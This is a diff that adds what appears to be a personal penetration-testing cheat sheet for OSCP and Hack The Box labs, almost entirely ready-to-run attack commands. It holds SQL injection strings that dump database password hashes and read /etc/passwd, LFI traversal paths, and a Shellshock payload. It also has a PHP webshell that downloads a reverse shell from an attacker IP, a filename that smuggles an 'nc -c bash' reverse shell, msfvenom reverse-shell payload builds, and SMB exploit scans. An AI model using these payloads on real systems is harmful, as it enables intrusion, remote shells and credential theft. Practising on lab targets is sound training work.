@@ -1,0 +1,79 @@
+https://redteams.fr/mindmap/view.html?url=.%2Fmaps%2Foscp.mymind
+#ms17-010
+https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+
+#http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html
+id=1'+and+0+Union+Select+1,group_concat(column_name),3+ FROM information_schema.columns WHERE table_name="user"+--+
+id=1'+and+0+Union+Select+1,group_concat(table_name),3+ FROM information_schema.tables WHERE table_schema="security"+--+
+union+select+1,2,group_concat(table_name,":",column_name),4,5,6,7+From+information_schema.columns+where+table_schema="databasetable"
+(select+group_concat(table_name,":",column_name)+from+information_schema.columns+where+table_schema="hotel")
+(select+group_concat(host,":",user,":",password)+from+mysql.user)
+(LOAD_FILE("/etc/passwd"))
+user()
+database()
+
+nmap -sC -sC -sV -oA nmap/json 10.10.10.158
+nmap  --script=smb-enum-users
+nmap --script=msrpc-enum 10.11.1.5
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.11.1.5
+nmap --script vuln -p 445 10.11.1.5
+nmap --script smb-enum-shares -p 139,445 
+nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4
+
+
+#LFI https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
+../../../../../../etc/passwd%00
+../../../../../../etc/passwd?
+
+#cgi-bin
+() { :;}; echo "Content-Type: text/html"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; hostnam
+
+#dav
+davtest --url http://10.11.1.39
+curl -X PUT http://10.11.1.14/test.html -d @test.html
+curl -X MOVE --header 'Destination:http://10.11.1.14/test.aspx' 'http://10.11.1.14/test.html'
+
+#hashcat
+hostashcat  --example-hashes|grep -i mysql -B2 -A4
+
+#phpshellupload
+<?php exec("wget -O /var/www/html/shell.php http://10.10.14.6:9443/reverseshell.php"); ?>
+
+#python
+python -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo 
+
+#find
+find / -perm -4000 -ls 2>/dev/null
+
+#touch
+touch -- ';nc -c bash 10.10.14.2 9445;.php'
+
+#gobuser
+gobuster dir -u http://supersecurehotel.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /home/kali/gobuster.log
+
+#wfuzz
+wfuzz -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -u http://supersecurehotel.htb/room.php?cod=1FUZZ 
+wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc '403,404' http://10.11.1.35/FUZZ
+
+#smbmap
+smbmap -H 10.10.10.123
+smbmap -H 10.10.10.123 -R --depth 5
+smbclient //10.10.10.123/general
+smbmap -H 10.10.10.123 -u admin -p 'asd123'
+smbmap -H 10.10.10.123 -u admin -p 'asd123' -d directoryname
+
+#dig
+dig axfr @10.10.10.123 dnsname
+
+#msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.5 LPORT=9443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 LPORT=9443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
+
+
+
+
+
+
+
+
